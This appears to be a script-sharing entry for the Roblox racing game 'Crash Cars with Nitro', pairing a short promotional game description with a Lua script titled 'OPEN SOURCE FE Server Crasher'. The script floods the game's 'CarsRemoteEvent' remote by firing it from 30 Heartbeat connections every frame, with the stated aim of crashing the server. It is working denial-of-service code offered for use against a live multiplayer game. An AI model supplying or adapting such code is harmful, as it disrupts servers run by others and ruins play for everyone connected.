name: Crash Cars with Nitro
desc:
🏎️ Crash Cars with Nitro is a high-octane racing and crashing simulator where you drift, boost, and smash through stunt-filled tracks and chaotic worlds! Soar off ramps, dodge obstacles, and blast past rivals with nitro-fueled speed. Wreck opponents, unleash mayhem, and most important of all, have fun! 🌟

🎮 Keybinds:
Ctrl – Sprint

scripts.title: OPEN SOURCE FE Server Crasher
scripts.script:
-- @build-failed
-- crash server

local getservice = game.GetService

local runservice = getservice(game, "RunService")
local replicatedstorage = getservice(game, "ReplicatedStorage")

local CarsRemoteEvent = replicatedstorage:WaitForChild("Specific Remotes"):WaitForChild("CarsRemoteEvent")

for i = 1, 30 do
    runservice.Heartbeat:Connect(function()
        CarsRemoteEvent:FireServer("Vugatti Layron")
    end)
end
